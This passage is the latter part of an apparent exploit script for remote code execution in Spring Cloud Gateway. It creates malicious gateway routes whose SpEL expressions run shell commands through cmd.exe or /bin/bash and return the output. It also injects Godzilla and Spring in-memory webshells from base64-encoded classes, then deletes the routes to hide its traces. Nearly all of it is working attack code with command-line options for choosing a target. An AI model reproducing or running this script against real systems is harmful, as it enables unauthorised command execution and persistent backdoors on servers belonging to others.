                print("[+] godzilla memshell: "+url.strip('/')+gpath)
                print(f"[+] pass: {gpass} key: {gkey}")
                # print("start delete route "+randomstr)
                deleteUrl = url.strip('/')+path1+"/"+randomstr
                r = requests.delete(url=deleteUrl,headers=headers,verify=False,timeout=7)
                r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
                # print("delete route "+randomstr+" success")
        else:
            print("refresh fail|resp code "+r.status_code)
    else:
        print("create route fail|resp code "+r.status_code)

# force to exploit
def commandExec(url,os,command):
    if os == "win":
        data={
            "filters": [{
                "name": "SetResponseHeader",
                "args": {
                    "name": randomstr,
                    "value": f"#{{new java.util.Scanner(new java.lang.ProcessBuilder('cmd.exe', '/c', '{command}').start().getInputStream(), 'UTF-8').useDelimiter('{randomstr}').next()}}"
                }
            }],
            "uri": "http://example.com"
        }
    elif os == "linux":
        data={
            "filters": [{
                "name": "SetResponseHeader",
                "args": {
                    "name": randomstr,
                    "value": f"#{{new java.util.Scanner(new java.lang.ProcessBuilder('/bin/bash', '-c', '{command}').start().getInputStream(), 'UTF-8').useDelimiter('{randomstr}').next()}}"
                }
            }],
            "uri": "http://example.com"
        }

    # created
    createUrl = url.strip('/')+path1+"/"+randomstr
    r = requests.post(url=createUrl,headers=headers,json=data,verify=False,timeout=7)
    if r.status_code == 201:
        # refresh
        refreshUrl = url.strip('/')+path2
        r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
        if r.status_code == 200:
            # check result
            checkUrl = url.strip('/')+path1+"/"+randomstr
            r = requests.get(url=checkUrl,headers=headers,verify=False,timeout=7)
            # print(r.text)
            pattern = re.compile(r"(%s) = '.*?\\n']" %randomstr)
            cmdresult = pattern.search(r.text).group(0).strip(f"{randomstr} = '").strip("\\n']").replace("\\n","\n")
            print(cmdresult)
            # print("start delete route "+randomstr)
            deleteUrl = url.strip('/')+path1+"/"+randomstr
            r = requests.delete(url=deleteUrl,headers=headers,verify=False,timeout=7)
            r = requests.post(url=refreshUrl,headers=headers,verify=False,timeout=7)
            # print("delete route "+randomstr+" success")
        else:
            print("refresh fail|resp code "+r.status_code)
    else:
        print("create route fail|resp code "+r.status_code)

# config args
def argsParse():
    parser = optparse.OptionParser('usage: python spring-gateway-rce.py -t <type> -u <url> -p <path>')
    parser.add_option('-t',dest='type',type='string',help='use list: [check, spring, godzilla, force]')
    parser.add_option('-u',dest='url',type='string',help='target url')
    parser.add_option('-p',dest='path',type='string',help='memshell path')
    parser.add_option('-o',dest='os',type='string',help='os list: [win, linux]')
    parser.add_option('-c',dest='command',type='string',help='command with force exploit')


    (option,args)=parser.parse_args()

    if option.type == None or option.url == None:
        print(parser.usage)
        exit()

    if option.type == "check":
        data = postdata(checkstr)
        check(option.url,data)

    elif option.type == "force" and option.os and option.command:
        commandExec(option.url,option.os,option.command)

    elif option.type == "spring" and option.path:
        payload = f"T(org.springframework.cglib.core.ReflectUtils).defineClass('SpringRequestMappingMem',T(org.springframework.util.Base64Utils).decodeFromString('{springmemb64}'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).run(@requestMappingHandlerMapping,'{option.path}')"
        data = postdata(payload)
        spring(option.url,data,option.path)

    elif option.type == "godzilla" and option.path:
        payload = f"T(org.springframework.cglib.core.ReflectUtils).defineClass('GMem',T(org.springframework.util.Base64Utils).decodeFromString('{gemb64}'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping,'{option.path}','{gpass}','{gkey}')"
        data = postdata(payload)
        godzilla(option.url,data,option.path)

    else:
        print("-t type only in check, spring, godzilla, force")
        print("inject memshell must with -p path")
        print("force exploit must set -o os and -c command, and not recommended because destroy prod risk")


if __name__ == '__main__':
    argsParse()
